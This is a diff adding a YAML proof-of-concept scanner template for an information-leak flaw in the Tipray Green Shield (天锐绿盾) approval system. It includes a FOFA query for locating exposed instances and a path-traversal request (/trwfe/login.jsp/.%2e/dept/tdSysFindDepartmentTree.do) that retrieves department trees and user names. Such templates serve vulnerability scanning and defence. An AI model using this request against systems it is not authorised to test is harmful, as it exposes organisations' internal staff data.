@@ -1,0 +1,19 @@
+id: poc-yaml-tipray-gsas-tdsysfinddepartmenttree-do-info-leak
+info:
+  name: 天锐绿盾审批系统 tdSysFindDepartmentTree.do 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+requests:
+- method: GET
+  path: /trwfe/login.jsp
+  expression: status_code == 200 && contains(body,"天锐绿盾审批系统")
+- method: GET
+  path: /trwfe/login.jsp/.%2e/dept/tdSysFindDepartmentTree.do
+  expression: status_code == 200 && contains(body,"\"parentId\":") && contains(body,"\"userNameArr\":")
+    && contains(body,"\"persistentState\":") && contains(body,"\"parentName\":") &&
+    !contains(body,"<")
+variables: {}
+transport: http
